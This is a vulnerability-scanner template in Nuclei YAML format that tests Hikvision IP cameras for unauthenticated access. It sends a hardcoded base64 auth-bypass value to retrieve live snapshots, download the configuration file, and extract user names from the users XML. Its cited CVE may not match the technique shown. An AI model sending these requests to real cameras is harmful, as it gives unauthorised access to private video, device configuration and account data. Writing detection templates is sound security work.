id: hikvision-cam-info-exposure

info:
  name: Hikvision IP Camera - Snapshot, Config, and User Info Exposure
  author: AbdulrahmanTamim
  severity: high
  description: >
    Detects unauthenticated exposure of sensitive endpoints on vulnerable Hikvision IP cameras.
    This includes live snapshot feeds, encrypted configuration files, and full user credential XML.
    Based on exploit chaining of CVE-2021-36260 and related bypass logic.
  reference:
    - https://www.cve.org/CVERecord?id=CVE-2021-36260
    - https://nvd.nist.gov/vuln/detail/CVE-2021-36260
  tags: hikvision,iot,camera,cve,cve2021,exposure,auth-bypass,config,snapshot,xml

variables:
  b64auth: YWRtaW46MTEK

requests:

  - method: GET
    path:
      - "{{BaseURL}}/onvif-http/snapshot?auth={{b64auth}}"
    headers:
      User-Agent: Mozilla/5.0
    matchers:
      - type: word
        part: header
        words:
          - "Content-Type: image/jpeg"
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: snapshot-endpoint
        part: request
        regex:
          - "/onvif-http/snapshot\\?auth=.*"

  - method: GET
    path:
      - "{{BaseURL}}/System/configurationFile?auth={{b64auth}}"
    headers:
      User-Agent: Mozilla/5.0
    matchers:
      - type: word
        part: header
        words:
          - "Content-Type: application/octet-stream"
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: config-download
        part: request
        regex:
          - "/System/configurationFile\\?auth=.*"

  - method: GET
    path:
      - "{{BaseURL}}/Security/users?auth={{b64auth}}"
    headers:
      User-Agent: Mozilla/5.0
    matchers:
      - type: word
        words:
          - "<userName>"
          - "<userLevel>"
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: exposed-usernames
        regex:
          - "<userName>(.*?)</userName>"
